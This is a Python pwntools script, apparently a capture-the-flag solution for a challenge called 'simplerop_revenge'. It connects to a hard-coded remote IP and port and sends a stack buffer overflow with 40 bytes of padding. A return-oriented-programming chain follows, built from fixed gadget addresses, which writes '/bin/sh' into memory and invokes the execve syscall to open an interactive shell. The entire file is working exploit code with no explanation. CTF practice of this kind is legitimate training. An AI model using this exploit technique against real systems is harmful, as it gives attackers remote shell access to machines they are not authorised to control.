#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vagrant <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

# p = process("./simplerop_revenge")
p = remote("140.110.112.31", 2124)
context.arch = "amd64"

p.recvuntil("Your input :")

payload = "A"*40
buf = 0x6cb500 # bss header

# Gadget
mov_prdi_rsi = 0x000000000047a502
pop_rdx = 0x00000000004427e6
pop_rsi = 0x0000000000401577
pop_rax_rbx_rbx = 0x0000000000478516
pop_rdi = 0x0000000000401456
syscall = 0x00000000004671b5

rop = flat([pop_rsi, "/bin/sh\x00", pop_rdi, buf, mov_prdi_rsi])
rop += flat([pop_rax_rbx_rbx, 0x3b, 0, 0])
rop += flat([pop_rsi, 0])
rop += flat([syscall])

p.sendline(payload + rop)
p.interactive()
